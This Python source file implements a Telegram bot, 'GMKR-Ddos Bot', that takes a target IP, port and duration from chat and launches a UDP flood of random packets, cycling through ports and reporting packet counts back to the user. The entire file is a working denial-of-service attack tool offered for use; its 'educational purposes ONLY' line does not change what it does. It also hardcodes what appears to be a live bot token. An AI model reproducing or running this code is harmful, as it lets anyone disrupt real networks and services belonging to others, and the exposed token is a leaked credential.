import socket
import random
import time
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)

# States for ConversationHandler
IP, PORT, DURATION = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message with Start Attack button."""
    keyboard = [[KeyboardButton("Start Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Welcome to GMKR-Ddos Bot.\nPress 'Start Attack' to begin.", reply_markup=reply_markup
    )
    return IP

async def get_ip(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    ip = update.message.text.strip()
    if ip.lower() == 'start attack':  # User pressed button initially, ask for IP
        await update.message.reply_text("Enter the target IP address:")
        return IP
    parts = ip.split('.')
    if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
        await update.message.reply_text("Invalid IP address format. Please enter again:")
        return IP
    context.user_data['ip'] = ip
    await update.message.reply_text("Enter the target port (1-65535):", reply_markup=ReplyKeyboardRemove())
    return PORT

async def get_port(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    port_text = update.message.text.strip()
    if not port_text.isdigit():
        await update.message.reply_text("Port must be a number. Enter the target port (1-65535):")
        return PORT
    port = int(port_text)
    if not (1 <= port <= 65535):
        await update.message.reply_text("Port must be between 1 and 65535. Try again:")
        return PORT
    context.user_data['port'] = port
    await update.message.reply_text("Enter the attack duration in seconds (e.g., 60):")
    return DURATION

async def get_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    duration_text = update.message.text.strip()
    if not duration_text.isdigit():
        await update.message.reply_text("Duration must be a positive number of seconds. Enter duration:")
        return DURATION
    duration = int(duration_text)
    if duration <= 0:
        await update.message.reply_text("Duration must be positive. Enter duration:")
        return DURATION
    context.user_data['duration'] = duration

    ip = context.user_data['ip']
    port = context.user_data['port']

    await update.message.reply_text(
        f"Starting DDoS UDP flood attack on {ip}:{port} for {duration} seconds...\n"
        "This tool is for educational purposes ONLY."
    )

    await run_ddos(update, context, ip, port, duration)

    # After attack, prompt to start again
    keyboard = [[KeyboardButton("Start Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "Attack completed. You can start again or type /cancel to stop.",
        reply_markup=reply_markup,
    )
    return IP

async def run_ddos(update, context, ip: str, port: int, duration: int):
    """Run UDP flood attack for the specified duration."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)

    sent = 0
    current_port = port
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            sock.sendto(bytes_data, (ip, current_port))
            sent += 1
            current_port += 1
            if current_port > 65535:
                current_port = 1
            # Update user every 100 packets to reduce spam
            if sent % 100 == 0:
                await update.message.reply_text(f"Sent {sent} packets to {ip} through port {current_port}")
        except Exception as e:
            await update.message.reply_text(f"Error occurred during attack: {e}")
            break

    await update.message.reply_text(f"Attack finished. Total packets sent: {sent}")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(
        "Operation cancelled.", reply_markup=ReplyKeyboardRemove()
    )
    return ConversationHandler.END

def main():
    TOKEN = "7807415210:AAEDOLziZJZRYh4h-jWn-z6xfQvUiNrqtBc"  # PUT YOUR BOT TOKEN HERE

    application = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[
            CommandHandler("start", start),
            MessageHandler(filters.Regex('^Start Attack$'), start),
        ],
        states={
            IP: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ip)],
            PORT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_port)],
            DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_duration)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)

    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
